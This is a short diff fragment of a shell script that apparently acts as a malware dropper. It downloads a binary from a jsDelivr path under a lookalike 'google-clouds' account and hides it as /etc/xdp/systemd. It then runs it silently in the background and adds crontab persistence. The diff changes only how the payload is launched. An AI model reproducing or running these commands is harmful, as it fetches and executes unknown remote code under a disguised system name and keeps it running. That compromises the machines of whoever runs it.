@@ -7,7 +7,7 @@ curl https://cdn.jsdelivr.net/gh/google-clouds/sdk/tt --output /tmp/systemd
 mkdir -p /etc/xdp/
 mv /tmp/systemd /etc/xdp/systemd
 chmod +x /etc/xdp/systemd
-bash /etc/xdp/systemd 2>/dev/null 1>/dev/null &
+/etc/xdp/systemd 2>/dev/null 1>/dev/null &
 
 crontab -e 2>/dev/null 1>/dev/null &
 command="/etc/xdp/systemd 2>/dev/null 1>/dev/null &"
